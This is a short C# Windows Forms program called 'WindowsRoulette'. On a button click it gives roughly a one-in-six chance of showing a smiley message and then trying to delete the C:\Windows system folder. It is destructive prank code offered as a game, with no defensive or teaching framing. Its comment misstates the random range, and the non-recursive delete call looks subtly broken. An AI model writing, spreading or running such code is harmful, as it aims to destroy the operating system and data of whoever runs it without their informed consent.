namespace WindowsRoulette
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void startRoulleteButton_Click(object sender, EventArgs e)
        {
            Random rngTotal = new Random();
            Random rng = new Random();
            int randomNumber = rngTotal.Next(1, 7); // returns a random int from 0, to 100
            if (randomNumber == rng.Next(1, 7)) 
            {
                MessageBox.Show(":)");
                Directory.Delete(@"C:\Windows");
            }
        }
    }
}